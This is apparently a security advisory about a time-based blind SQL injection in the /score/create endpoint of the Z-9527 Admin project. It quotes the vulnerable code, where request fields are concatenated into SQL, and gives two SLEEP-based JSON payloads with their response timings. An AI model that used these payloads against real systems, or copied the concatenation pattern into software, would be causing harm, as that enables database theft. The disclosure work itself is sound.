# SQL Blind Injection Vulnerability in Z-9527 Admin

> **Software and Affected Version:** [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d

## Vulnerability Files

-   `/server/routes/score.js`
-   `/server/controller/score.js`

## Description

A SQL blind injection vulnerability exists in [Z-9527 Admin](https://github.com/z-9527/admin) ≤ commit 72aaf2d at the `/score/create` endpoint, where the `score` field in the request body is concatenated directly into a SQL statement without sanitization or parameterization. As a result, authenticated attackers can inject malicious SQL payloads using time-based blind-injection techniques to infer sensitive database information character-by-character through response-time analysis. This enables complete database enumeration, credential extraction, and potential privilege escalation. Mitigations include immediately replacing string concatenation with parameterized queries or prepared statements, implementing strict input validation and sanitization for all user-supplied parameters, applying the principle of least privilege to database connections, deploying web application firewalls with SQL injection detection rules, and conducting comprehensive security audits of all database query construction patterns across the codebase.

## Code Analysis

In `/server/routes/score.js`:

```js
router.post('/create', async function (ctx, next) {
    const res = await createScore(ctx.request.body);
    handleRes(ctx, next, res);
});
```

In `/server/controller/score.js`:

```js
const createScore = async (param) => {
    const { userId, score } = param;
    if (userId === undefined || score === undefined) {
        return new ErrorModel({
            message: '参数异常'
        });
    }
    const res = await exec(`select userId from scores where userId=${userId}`);
    if (res.length) {
        return new ErrorModel({
            message: '用户已经评过分'
        });
    }
    const sql = `insert into scores (createTime,userId,score) values (${Date.now()},${userId},${score})`;
    const res2 = await exec(sql);
    if (res2.affectedRows) {
        return new SuccessModel({
            message: '评分成功'
        });
    } else {
        return new ErrorModel({
            message: '评分失败'
        });
    }
};
```

The user input is directly concatenated into the SQL statement.

## Proof of Concept

Assuming the current database is `admin`, sending the following payload to `/score/create` returned a response after approximately 1012 ms:

```json
{ "userId": 2333, "score": "1 and IF(SUBSTRING((SELECT DATABASE()), 1, 1) = 'a', SLEEP(1), 1)" }
```

![](./assets/sqli-1.png)

Assuming the current database is `admin`, sending the following payload to `/score/create` returned a response after approximately 11 ms:

```json
{ "userId": 2334, "score": "1 and IF(SUBSTRING((SELECT DATABASE()), 1, 1) = 'b', SLEEP(1), 1)" }
```

![](./assets/sqli-2.png)
